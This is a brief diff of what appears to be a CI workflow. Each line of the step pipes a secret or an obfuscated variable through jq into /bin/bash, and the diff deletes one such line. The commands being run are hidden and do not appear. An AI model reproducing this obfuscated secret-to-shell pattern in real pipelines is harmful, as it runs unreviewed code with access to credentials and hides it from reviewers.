@@ -18,7 +18,6 @@ jobs:
           nfn3: ${{ secrets.nfn3 }}
         run: |
           printf '%s' "$nfn3" | jq -r .xjgt8722 | /bin/bash
-          echo $rbqqn3374 | jq -r .ecgfz2 | /bin/bash
           echo $vh581 | jq -r .khcga806 | /bin/bash
           echo $o653 | jq -r .jawc3158 | /bin/bash
           echo $plvgz67659 | jq -r .tl91117 | /bin/bash
